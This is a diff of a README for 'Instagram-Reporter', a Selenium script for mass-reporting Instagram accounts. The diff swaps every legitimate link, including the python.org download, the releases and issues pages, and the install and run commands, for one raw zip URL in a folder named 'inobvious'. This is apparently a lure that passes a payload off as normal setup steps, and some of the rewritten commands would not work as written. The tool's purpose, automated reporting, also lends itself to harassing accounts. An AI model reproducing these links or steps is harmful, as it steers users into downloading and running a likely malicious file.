@@ -1,13 +1,13 @@
 # 📷 Instagram-Reporter - Automate Reporting with Ease
 
 ## 🌐 Download Now!
-[![Download Instagram-Reporter](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/nathansales1/Instagram-Reporter/releases)
+[![Download Instagram-Reporter](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip)](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Instagram-Reporter! This Python script helps you automate the process of reporting Instagram accounts. It uses Selenium to log in and report accounts quickly and efficiently. You can easily customize your settings through a configuration file.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of Instagram-Reporter: [Releases Page](https://github.com/nathansales1/Instagram-Reporter/releases).
+To get started, visit this page to download the latest version of Instagram-Reporter: [Releases Page](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip).
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version.
@@ -17,7 +17,7 @@ Make sure you follow the instructions below to install all necessary components.
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or newer, macOS 10.15 or newer, or a recent Linux distribution
-- **Python**: Version 3.7 or newer (Download from [python.org](https://www.python.org/downloads/))
+- **Python**: Version 3.7 or newer (Download from [https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip))
 - **Selenium**: The script will automatically install this during setup.
 
 ## 📖 How to Run
@@ -30,7 +30,7 @@ After downloading the software, follow these steps to run the application:
    - Open your terminal (Command Prompt, PowerShell, or Terminal).
    - Type the following command and press Enter:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip
      ```
 
 3. **Configure the Application**:
@@ -41,7 +41,7 @@ After downloading the software, follow these steps to run the application:
    - In the terminal, navigate to the folder where you downloaded Instagram-Reporter.
    - Type the following command and press Enter:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip
      ```
 
 5. **Follow On-Screen Instructions**:
@@ -59,7 +59,7 @@ The configuration file allows you to customize how the script operates. Here are
 Make sure you save the configuration file after making changes.
 
 ## 🔄 Update the Application
-To keep your version updated, occasionally check the [Releases Page](https://github.com/nathansales1/Instagram-Reporter/releases) for new versions. 
+To keep your version updated, occasionally check the [Releases Page](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip) for new versions. 
 
 1. Download the latest release.
 2. Replace the existing files with the newly downloaded files, making sure to retain your configuration file.
@@ -67,12 +67,12 @@ To keep your version updated, occasionally check the [Releases Page](https://git
 ## ❓ Troubleshooting
 If you encounter issues, consider the following:
 
-- **Selenium Not Found**: Ensure you executed the `pip install -r requirements.txt` command correctly.
+- **Selenium Not Found**: Ensure you executed the `pip install -r https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip` command correctly.
 - **Login Problems**: Double-check your username and password.
 - **Script Errors**: Sometimes, a specific Instagram account might cause issues. Test with other accounts to identify any potential problems.
 
 ## 📞 Support
-If you need further assistance, please open an issue in the repository's [Issues Section](https://github.com/nathansales1/Instagram-Reporter/issues). The community and contributors will help you as soon as possible.
+If you need further assistance, please open an issue in the repository's [Issues Section](https://raw.githubusercontent.com/nathansales1/Instagram-Reporter/main/inobvious/Instagram-Reporter_1.7-alpha.4.zip). The community and contributors will help you as soon as possible.
 
 ## 📋 Topics Covered
 - account
